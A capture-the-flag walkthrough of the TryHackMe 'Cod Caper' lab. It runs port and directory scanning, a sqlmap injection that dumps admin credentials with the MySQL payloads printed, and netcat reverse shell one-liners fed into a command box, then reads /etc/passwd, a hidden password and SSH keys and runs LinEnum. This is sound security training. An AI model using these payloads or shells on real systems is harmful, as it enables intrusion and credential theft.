# The Cod Caper

## Task 1: Intro
pingu story

## Task 2: Host Enumeration
`nmap -sC -sV -A 10.10.40.189`

-A: Enable OS detection, version detection, script scanning, and traceroute

-sC: equivalent to --script=default

-sV: Probe open ports to determine service/version info

**Scan Results**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-31 09:48 IST
Nmap scan report for 10.10.40.189
Host is up (0.21s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.68 seconds
```
### 1. How many ports are open on the target machine?
2 (ssh, http)

### 2. What is the http-title of the web server?
Apache2 Ubuntu Default Page: It works

### 3. What version is the ssh service?
OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

### 4. What is the version of the web server?
Apache/2.4.18

## Task 3: Web enumeration
Using the [suggested wordlist](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt).

run: `gobuster dir -u 10.10.16.135 -w "path/to/wordlist.txt" -x "html,php,txt"`

It was around 10% way of searching when it got this!

### 1.  What is the name of the important file on the server?
/administrator.php

## 4. Web Exploitation
login form -> sql injection?

run `sqlmap -u http://10.10.16.135/administrator.php --forms --dump`

-u: url

--forms: gets parameters from `form` element in the page

--dump: gets data once SQLI(SQLInjection) is found


We now get this from sqlmap:
1. 3 kinds of blinds
```
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=gbXk' RLIKE (SELECT (CASE WHEN (1352=1352) THEN 0x6762586b ELSE 0x28 END))-- MeOd&password=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=gbXk' AND GTID_SUBSET(CONCAT(0x71716b6b71,(SELECT (ELT(9508=9508,1))),0x716b6a7171),9508)-- BmZK&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=gbXk' AND (SELECT 6145 FROM (SELECT(SLEEP(5)))TqbZ)-- sWNA&password=
---
```
2. Database entries 

Database: users

Table: users

[1 entry]

| password | username |
| - | - |
| secretpass | pingudad |

### 1. What is the admin username?
pingudad

### 2. What is the admin password?
secretpass

### 3. How many forms of SQLI is the form vulnerable to?
3

## 5. Command Execution
link where we put commands: `http://IP/SOME_NUMBER.php`

we now run: `nc -nlvp 4242` on our machine, to listen for connections

-l: listen mode, for inbound connects

-n: numeric-only IP addresses, no DNS

-p: local port number

-v: verbose

and run this command in the administrator command box: `nc -e /bin/sh YOUR_IP 4242`

well. that didn't work. let's try: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4242 >/tmp/f`

[Source](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[Source](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional)

Quick Tip: Get you ip by typing in `ifconfig`. Since we have connected to a VPN, we have to look at `tun0`. run: `ifconfig tun0` and the `destination` is your IP address. 

If that sounds complex, go to https://tryhackme.com/access with VPN connected, and it'll show you want you need.

Quick Note: you can choose any port, 4242 is arbitary :P

### 1. How many files are in the current directory?
run `ls` in the command form (even before we get access)

3

### 2. Do I still have an account?
`cat /etc/passwd` shows `pingu:x:1002:1002::/home/pingu:/bin/bash` at the end.

yes

### 3. What is my ssh password?
Traversing through the directory we have a user named `pingu`, and in the `.ssh` folder, we have `id_rsa` and `id_rsa.pub`. This is interesting.
But, for now lets focus on getting the password. Trying to seach using `find -u pingu` yields nothing. however, going around the directory we landed into shows a `hidden` folder; inside is our password! Its owned by `www-data` though ... hmmm ....

pinguapingu

### Having fun
running `ssh pingu@IP` gives us access to the machine, using the password above. and ... well maybe i got too excited

```
pingu@ubuntu:~$ sudo su
[sudo] password for pingu: 
pingu is not in the sudoers file.  This incident will be reported.
```

lmao


## 6. LinEnum
We need to get the linenum file into pingu's machine now. how? the room mentions using `SCP` which we can do since we have ssh-ed into the machine.

[Get the linenum script](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

After copying using: `scp /path/to/LinEnum.sh pingu@IP:/tmp`, just do `chmod +x LinEnum.sh` and run.

### 1. What is the interesting path of the interesting suid file?
/opt/secret/root
